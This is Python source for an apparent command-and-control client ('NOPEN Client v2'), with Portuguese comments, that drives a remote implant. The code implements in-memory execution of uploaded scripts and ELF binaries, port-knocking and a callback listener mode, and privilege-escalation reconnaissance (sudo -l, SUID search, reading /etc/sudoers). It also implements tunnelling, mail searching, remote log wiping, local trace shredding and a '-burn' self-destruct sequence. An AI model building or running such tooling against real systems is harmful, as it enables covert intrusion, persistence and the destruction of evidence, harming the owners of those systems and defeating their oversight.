    def _exec(self, cmd: str) -> str:
        self._cmd_log.append((datetime.now(timezone.utc).isoformat(), cmd))
        if self.local_mode or self.conn is None:
            return self.local_exec.run(cmd)
        try:
            return self.conn.send_cmd(cmd)
        except Exception as e:
            return f"{C.RED}[!] Erro de rede: {e}{C.RESET}"

    def _print_out(self, text: str):
        end = "" if text.endswith("\n") else "\n"
        print(text, end=end)
        if self._output_file:
            try:
                with open(self._output_file, "a") as f:
                    f.write(text + "\n")
            except Exception:
                pass

    # ── Prompt ────────────────────────────────────────────────────────────────
    def _prompt(self) -> str:
        ts  = datetime.now(timezone.utc).strftime("%m-%d-%y %H:%M:%S GMT")
        src = "localhost"
        dst = (f"testhost.{self.host}:{self.port}"
               if not self.local_mode else "localhost")
        obfs = f"|{self.obfs_mode}" if self.obfs_mode != "raw" else ""
        return (
            f"\n{C.RED}NO!{C.RESET} "
            f"{C.DIM}[{ts}][{src} -> {dst}{obfs}]{C.RESET}\n"
            f"{C.GREEN}[-help]{C.RESET} "
        )

    # ── Dispatch ──────────────────────────────────────────────────────────────
    def _dispatch(self, line: str) -> bool:
        """Retorna False para encerrar o loop."""
        line = line.strip()
        if not line or line.startswith("#"):
            return True

        # ─────────────────────────────────────────────────────────────────────
        # SAÍDA
        # ─────────────────────────────────────────────────────────────────────
        if line in ("-exit", "exit", "quit"):
            self._do_exit()
            return False

        # ─────────────────────────────────────────────────────────────────────
        # AJUDA / INFO
        # ─────────────────────────────────────────────────────────────────────
        if line in ("-help", "--help", "help"):
            print(HELP_TEXT)
            return True

        if line in ("-hist", "-history"):
            self._do_hist()
            return True

        if line == "-status":
            self._do_status()
            return True

        # ─────────────────────────────────────────────────────────────────────
        # [NOVO] PORT KNOCK
        # ─────────────────────────────────────────────────────────────────────
        if line.startswith("-knock "):
            # Uso: -knock 7000,8000,9000 [tcp|udp]
            parts  = line.split()
            seq_s  = parts[1] if len(parts) > 1 else ""
            proto  = parts[2] if len(parts) > 2 else "tcp"
            try:
                seq = [int(p) for p in seq_s.split(",") if p]
            except ValueError:
                print(f"{C.RED}[!] Uso: -knock <p1,p2,p3> [tcp|udp]{C.RESET}")
                return True
            pk = PortKnocker(self.host, seq, proto=proto)
            pk.knock()
            return True

        # ─────────────────────────────────────────────────────────────────────
        # [NOVO] LISTEN MODE (mudar para modo passivo em tempo de execução)
        # ─────────────────────────────────────────────────────────────────────
        if line.startswith("-listen"):
            parts = line.split()
            lport   = int(parts[1]) if len(parts) > 1 else self.listen_port
            timeout = int(parts[2]) if len(parts) > 2 else 120
            if self.conn and self.conn.connected:
                print(f"{C.YELLOW}[*] Já conectado. Desconecte antes de usar -listen.{C.RESET}")
                return True
            lm  = ListenMode("0.0.0.0", lport, timeout=timeout)
            sok = lm.wait_for_implant()
            if sok:
                self.conn = NOPENConnection(self.host, self.port, obfs_mode=self.obfs_mode)
                try:
                    self.conn.attach(sok)
                    print(f"{C.GREEN}[+] Sessão cifrada estabelecida (modo Listen){C.RESET}")
                except Exception as e:
                    print(f"{C.RED}[!] Handshake falhou: {e}{C.RESET}")
            return True

        # ─────────────────────────────────────────────────────────────────────
        # [NOVO] OFUSCAÇÃO
        # ─────────────────────────────────────────────────────────────────────
        if line.startswith("-obfs"):
            parts = line.split()
            if len(parts) < 2:
                print(f"  Modo atual : {C.CYAN}{self.obfs_mode}{C.RESET}")
                print(f"  Modos      : {', '.join(TrafficObfuscator.MODES)}")
                print(f"  {C.DIM}Nota: dns/http são descritivos — o wire TCP com nopen_server.py")
                print(f"  é sempre raw. Um relay de obfuscação completo exigiria proxy dedicado.{C.RESET}")
                return True
            mode = parts[1].lower()
            if mode not in TrafficObfuscator.MODES:
                print(f"{C.RED}[!] Modo inválido. Use: {', '.join(TrafficObfuscator.MODES)}{C.RESET}")
                return True
            self.obfs_mode = mode
            if self.conn:
                self.conn.obfs = mode
            if mode != "raw":
                print(f"{C.GREEN}[+] Modo de ofuscação: {mode}{C.RESET}")
                print(f"  {C.YELLOW}[!] Nota: o wire TCP permanece raw (compatível com nopen_server.py).{C.RESET}")
                print(f"  {C.DIM}    Para obfuscação real no fio, use um relay intermediário.{C.RESET}")
            else:
                print(f"{C.GREEN}[+] Modo de ofuscação: raw{C.RESET}")
            return True

        # ─────────────────────────────────────────────────────────────────────
        # [NOVO] WIPE DE LOGS (no servidor remoto)
        # ─────────────────────────────────────────────────────────────────────
        if line.startswith("-wipelogs"):
            parts = line.split()
            user  = parts[1] if len(parts) > 1 else ""
            host  = parts[2] if len(parts) > 2 else ""
            # Envia comando especial -wipelogs para o servidor
            out = self._exec(f"-wipelogs {user} {host}".strip())
            self._print_out(out)
            return True

        # ─────────────────────────────────────────────────────────────────────
        # [NOVO] WIPE LOCAL (rastros na máquina do operador)
        # ─────────────────────────────────────────────────────────────────────
        if line == "-wipelocal":
            print(f"{C.YELLOW}[*] Limpando rastros locais...{C.RESET}")
            result = TraceWiper.wipe_local_traces()
            print(result)
            return True

        # ─────────────────────────────────────────────────────────────────────
        # [NOVO] SHRED de arquivo
        # ─────────────────────────────────────────────────────────────────────
        if line.startswith("-shred "):
            path = line[7:].strip()
            print(TraceWiper.shred_file(path))
            return True

        # ─────────────────────────────────────────────────────────────────────
        # [NOVO] EXECUÇÃO EM MEMÓRIA
        # ─────────────────────────────────────────────────────────────────────
        if line.startswith("-memexec "):
            script_path = line[9:].strip()
            if not os.path.exists(script_path):
                print(f"{C.RED}[!] Arquivo não encontrado: {script_path}{C.RESET}")
                return True
            with open(script_path, "rb") as f:
                code = f.read()
            # Envia código para servidor executar em memória
            b64  = base64.b64encode(code).decode()
            out  = self._exec(f"-memexec {b64}")
            self._print_out(out)
            return True

        if line.startswith("-memelf "):
            bin_path = line[8:].strip()
            if not os.path.exists(bin_path):
                print(f"{C.RED}[!] Arquivo não encontrado: {bin_path}{C.RESET}")
                return True
            with open(bin_path, "rb") as f:
                data = f.read()
            b64 = base64.b64encode(data).decode()
            out = self._exec(f"-memelf {b64}")
            self._print_out(out)
            return True

        # ─────────────────────────────────────────────────────────────────────
        # BURN (aprimorado com wipe antes de encerrar)
        # ─────────────────────────────────────────────────────────────────────
        if line == "-burn":
            print(f"{C.RED}{C.BOLD}[!] BURN — Iniciando sequência de destruição...{C.RESET}")
            # 1. Wipe remoto
            print(f"{C.YELLOW}  [1/3] Wipe de logs remotos...{C.RESET}")
            out = self._exec("-wipelogs")
            self._print_out(out)
            # 2. Wipe local
            print(f"{C.YELLOW}  [2/3] Wipe de rastros locais...{C.RESET}")
            print(TraceWiper.wipe_local_traces())
            # 3. Encerra servidor
            print(f"{C.YELLOW}  [3/3] Encerrando servidor...{C.RESET}")
            if self.conn:
                try: self.conn.send_cmd("-burn")
                except: pass
                self.conn.close()
            print(f"{C.RED}[!] BURN concluído.{C.RESET}")
            return False

        # ─────────────────────────────────────────────────────────────────────
        # COMANDOS LOCAIS
        # ─────────────────────────────────────────────────────────────────────
        if line == "-lpwd":
            print(self.local_exec.cwd)
            return True

        if line == "-lgetenv":
            for k, v in os.environ.items():
                print(f"{k}={v}")
            return True

        if line.startswith("-lsetenv "):
            kv = line[9:].strip()
            if "=" in kv:
                k, v = kv.split("=", 1)
                os.environ[k] = v
                print(f"[+] {k}={v}")
            return True

        if line.startswith("-lcd "):
            path = os.path.expanduser(line[5:].strip())
            try:
                os.chdir(path)
                self.local_exec.cwd = os.getcwd()
                print(f"[cwd] {self.local_exec.cwd}")
            except Exception as e:
                print(f"{C.RED}[!] {e}{C.RESET}")
            return True

        if line.startswith("-lsh "):
            cmd   = line[5:].strip()
            quiet = cmd.startswith("-q ")
            if quiet: cmd = cmd[3:]
            out = self.local_exec.run(cmd)
            if not quiet: self._print_out(out)
            return True

        if line.startswith("-remark ") or line.startswith("-rem "):
            comment = line.split(" ", 1)[1]
            ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            print(f"{C.DIM}# [{ts}] {comment}{C.RESET}")
            return True

        if line == "-reset":
            self._cmd_log.clear()
            print(f"{C.YELLOW}[*] Sessão resetada{C.RESET}")
            return True

        if line.startswith("-cmdout"):
            parts = line.split()
            if len(parts) > 1:
                self._output_file = parts[1]
                print(f"[+] Saída → {self._output_file}")
            else:
                self._output_file = None
                print("[+] Redirecionamento desativado")
            return True

        if line.startswith("-readrc"):
            parts = line.split()
            fname = parts[1] if len(parts) > 1 else os.path.expanduser("~/.nopenrc")
            self._do_readrc(fname)
            return True

        if line == "-shell":
            print(f"{C.CYAN}[*] Shell interativo — Ctrl+D para voltar{C.RESET}")
            subprocess.run(os.environ.get("SHELL", "/bin/bash"))
            return True

        if line.startswith("-autopilot "):
            parts = line.split()
            print(f"{C.YELLOW}[*] Autopilot porta {parts[1]}{C.RESET}")
            return True

        # ─────────────────────────────────────────────────────────────────────
        # COMANDOS REMOTOS — Rede
        # ─────────────────────────────────────────────────────────────────────
        if line == "-time":
            self._print_out(self._exec("date -u"))
            return True

        if line == "-getenv":
            self._print_out(self._exec("env"))
            return True

        if line.startswith("-setenv "):
            self._print_out(self._exec(f"export {line[8:].strip()}"))
            return True

        if line == "-pid":
            self._print_out(self._exec("echo $$"))
            return True

        if line == "-ifconfig":
            self._print_out(self._exec("ip addr show 2>/dev/null || ifconfig"))
            return True

        if line.startswith("-nslookup "):
            h = line[10:].strip()
            self._print_out(self._exec(f"nslookup {h} 2>/dev/null || host {h}"))
            return True

        if line.startswith("-ping "):
            self._print_out(self._exec(f"ping -c 4 {line[6:].strip()}"))
            return True

        if line.startswith("-trace "):
            args = line[7:].strip()
            self._print_out(self._exec(f"traceroute {args} 2>/dev/null"))
            return True

        if line.startswith("-comptine "):
            self._print_out(self._exec(f"traceroute -I {line[10:].strip()}"))
            return True

        if line.startswith("-scan"):
            args = line[5:].strip() or "127.0.0.1"
            self._print_out(self._exec(f"nmap -sV --open {args}"))
            return True

        if line.startswith("-sentry "):
            self._print_out(self._exec(f"tcpdump {line[8:].strip()} -c 30 -nn"))
            return True

        if line == "-vscan":
            self._print_out(self._exec("nmap -sV --script=vuln 127.0.0.1"))
            return True

        # ─────────────────────────────────────────────────────────────────────
        # REDIRECIONAMENTO
        # ─────────────────────────────────────────────────────────────────────
        for prefix in ("-tunnel ", "-rtun ", "-nrtun ", "-irtun ",
                       "-stun ", "-sutun ", "-fixudp ", "-jackpop ",
                       "-rawsend ", "-chuli "):
            if line.startswith(prefix):
                self._print_out(self._exec(line))
                return True

        # ─────────────────────────────────────────────────────────────────────
        # ARQUIVOS E DIRETÓRIOS
        # ─────────────────────────────────────────────────────────────────────
        if line == "-elevate":
            cmds = [
                "id",
                "sudo -l 2>/dev/null",
                "find / -perm -4000 -type f 2>/dev/null | head -20",
                "cat /etc/sudoers 2>/dev/null | head -15",
            ]
            for c in cmds:
                out = self._exec(c)
                if out.strip():
                    self._print_out(f"{C.DIM}$ {c}{C.RESET}\n{out}")
            return True

        if line.startswith("-gs "):
            pat = line[4:].strip()
            self._print_out(self._exec(f"find / -name '{pat}' 2>/dev/null | head -30"))
            return True

        if line.startswith("-ls"):
            self._print_out(self._exec(f"ls {line[3:].strip()}"))
            return True

        if line.startswith("-cd "):
            self._print_out(self._exec(f"cd {line[4:].strip()} && pwd"))
            return True

        if line == "-cdp":
            self._print_out(self._exec("pwd"))
            return True

        if line.startswith("-find "):
            self._print_out(self._exec(f"find {line[6:].strip()}"))
            return True

        if line.startswith("-cat "):
            self._print_out(self._exec(f"cat {line[5:].strip()}"))
            return True

        if line.startswith("-tail "):
            self._print_out(self._exec(f"tail {line[6:].strip()}"))
            return True

        if line.startswith("-grep "):
            self._print_out(self._exec(f"grep {line[6:].strip()}"))
            return True

        if line.startswith("-strings "):
            self._print_out(self._exec(f"strings {line[9:].strip()}"))
            return True

        if line.startswith("-cksum "):
            f = line[7:].strip()
            self._print_out(self._exec(f"md5sum {f} && sha256sum {f}"))
            return True

        if line.startswith("-touch "):
            self._print_out(self._exec(f"touch {line[7:].strip()}"))
            return True

        if line.startswith("-get "):
            self._print_out(self._exec(f"-get {line[5:].strip()}"))
            return True

        if line.startswith(("-lput ", "-upload ")):
            parts = line.split(None, 2)
            if len(parts) >= 2:
                local_file = parts[1]
                dest       = parts[2] if len(parts) > 2 else f"/tmp/{os.path.basename(local_file)}"
                if os.path.exists(local_file):
                    with open(local_file, "rb") as fp:
                        data = base64.b64encode(fp.read()).decode()
                    out = self._exec(f"-put {data} {dest}")
                    self._print_out(out or f"[+] Enviado para {dest}")
                else:
                    print(f"{C.RED}[!] Arquivo não encontrado: {local_file}{C.RESET}")
            return True

        if line.startswith("-cklist "):
            self._print_out(self._exec(f"-cklist {line[8:].strip()}"))
            return True

        if line.startswith("-mailgrep "):
            self._print_out(self._exec(f"-mailgrep {line[10:].strip()}"))
            return True

        # ─────────────────────────────────────────────────────────────────────
        # SHELL DIRETO
        # ─────────────────────────────────────────────────────────────────────
        self._print_out(self._exec(line))
        return True

    # ── Auxiliares ────────────────────────────────────────────────────────────
    def _do_exit(self):
        uptime = str(datetime.now(timezone.utc) - self.start_time).split(".")[0]
        print(f"\n{C.CYAN}[*] Encerrando sessão {self.session_id} | uptime {uptime}{C.RESET}")
        if self.conn:
            try: self.conn.send_cmd("exit")
            except: pass
            self.conn.close()

    def _do_hist(self):
        print(f"\n{C.YELLOW}[ Histórico — {len(self._cmd_log)} comandos ]{C.RESET}")
        for i, (ts, cmd) in enumerate(self._cmd_log, 1):
            print(f"  {C.DIM}{ts}{C.RESET}  {i:>3}  {cmd}")

    def _do_status(self):
        uptime  = str(datetime.now(timezone.utc) - self.start_time).split(".")[0]
        mode    = "LOCAL" if self.local_mode else f"REMOTO {self.host}:{self.port}"
        conn_st = "OK" if (self.conn and self.conn.connected) else "Desconectado"
        print(f"""
{C.GREEN}╔══ STATUS DA SESSÃO ════════════════════════════╗{C.RESET}
  ID        : {self.session_id}
  Modo      : {mode}
  Conexão   : {conn_st}
  Cifra     : AES-256-GCM + RSA-2048
  Obfuscação: {self.obfs_mode}
  Uptime    : {uptime}
  Cmds      : {len(self._cmd_log)}
  Log out   : {self._output_file or 'desativado'}
  PID local : {os.getpid()}
  Platform  : {platform.system()} {platform.machine()}
{C.GREEN}╚════════════════════════════════════════════════╝{C.RESET}""")

    def _do_readrc(self, fname: str):
        if not os.path.exists(fname):
            print(f"{C.RED}[!] Arquivo não encontrado: {fname}{C.RESET}")
            return
        with open(fname) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    print(f"{C.DIM}[rc] {line}{C.RESET}")
                    if not self._dispatch(line):
                        break

    # ── Loop principal ─────────────────────────────────────────────────────────
    def run(self):
        print(BANNER)
        ts  = datetime.now(timezone.utc).strftime("%m-%d-%y %H:%M:%S GMT")
        src = "localhost"
        dst = f"testhost.{self.host}:{self.port}" if not self.local_mode else "localhost"
        print(f"{C.DIM}[{ts}][{src}:{self.port} -> {dst}]{C.RESET}")
        print(f"{C.GREEN}NO!{C.RESET} testhost:{src}/NOPEN-\n")

        if not self.connect():
            sys.exit(1)

        while True:
            try:
                line = input(self._prompt()).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                self._do_exit()
                break
            if not self._dispatch(line):
                break


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRYPOINT
# ══════════════════════════════════════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(
        description="NOPEN Client v2 — Remote Administration Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(r"""
        ── Modos de conexão ─────────────────────────────────────────────────
          Ativo (padrão):
            python3 nopen_client_v2.py -H 192.168.1.10 -p 4444

          Com port-knock:
            python3 nopen_client_v2.py -H 192.168.1.10 -p 4444 \
              --knock 7000,8000,9000 --knock-proto tcp

          Passivo (Listen — implante conecta de volta):
            python3 nopen_client_v2.py -H 192.168.1.10 -p 4444 \
              --listen --listen-port 4445

          Port-knock + Passivo (fluxo completo):
            python3 nopen_client_v2.py -H 192.168.1.10 -p 4444 \
              --knock 7000,8000,9000 --listen --listen-port 4445

        ── Ofuscação de tráfego ──────────────────────────────────────────────
            --obfs raw    sem ofuscação (padrão, compatível com server)
            --obfs dns    frames disfarçados como respostas DNS
            --obfs http   frames disfarçados como POST HTTP

        ── Modo local (testes sem servidor) ─────────────────────────────────
            python3 nopen_client_v2.py --local

        ── Instalar dependências ─────────────────────────────────────────────
            python3 nopen_client_v2.py --install-deps
        """)
    )
    parser.add_argument("-H", "--host",
        default="127.0.0.1", help="Host alvo (padrão: 127.0.0.1)")
    parser.add_argument("-p", "--port",
        type=int, default=4444, help="Porta C2 (padrão: 4444)")

    # Modo passivo
    g = parser.add_argument_group("Arquitetura Passiva")
    g.add_argument("--knock",
        default="", metavar="P1,P2,P3",
        help="Sequência de port-knock antes de conectar (ex: 7000,8000,9000)")
    g.add_argument("--knock-proto",
        default="tcp", choices=["tcp", "udp"],
        help="Protocolo do knock (padrão: tcp)")
    g.add_argument("--listen",
        action="store_true",
        help="Modo passivo: aguarda o implante conectar de volta")
    g.add_argument("--listen-port",
        type=int, default=4445,
        help="Porta local para modo Listen (padrão: 4445)")

    # Ofuscação
    g2 = parser.add_argument_group("Ofuscação de Tráfego")
    g2.add_argument("--obfs",
        default="raw", choices=TrafficObfuscator.MODES,
        help="Modo de ofuscação: raw|dns|http (padrão: raw)")

    # Geral
    parser.add_argument("--local",
        action="store_true", help="Modo local sem rede")
    parser.add_argument("--install-deps",
        action="store_true", help="pip install cryptography")

    args = parser.parse_args()

    if args.install_deps:
        subprocess.run([sys.executable, "-m", "pip", "install", "cryptography"], check=True)
        print("[+] Dependências instaladas.")
        sys.exit(0)

    if not CRYPTO_OK and not args.local:
        print(f"{C.RED}[!] Módulo 'cryptography' não encontrado.{C.RESET}")
        print(f"    Execute: {C.CYAN}python3 nopen_client_v2.py --install-deps{C.RESET}")
        sys.exit(1)

    knock_seq = []
    if args.knock:
        try:
            knock_seq = [int(p) for p in args.knock.split(",") if p]
        except ValueError:
            print(f"{C.RED}[!] Sequência de knock inválida: {args.knock}{C.RESET}")
            sys.exit(1)

    if args.obfs != "raw":
        print(f"{C.YELLOW}[!] Modo --obfs {args.obfs} selecionado.")
        print(f"    O wire TCP com nopen_server.py é sempre raw.")
        print(f"    Para obfuscação real no fio use um relay intermediário.{C.RESET}")

    client = NOPENClient(
        host        = args.host,
        port        = args.port,
        local_mode  = args.local,
        obfs_mode   = args.obfs,
        listen_mode = args.listen,
        listen_port = args.listen_port,
        knock_seq   = knock_seq,
        knock_proto = args.knock_proto,
    )
    client.run()


if __name__ == "__main__":
    main()
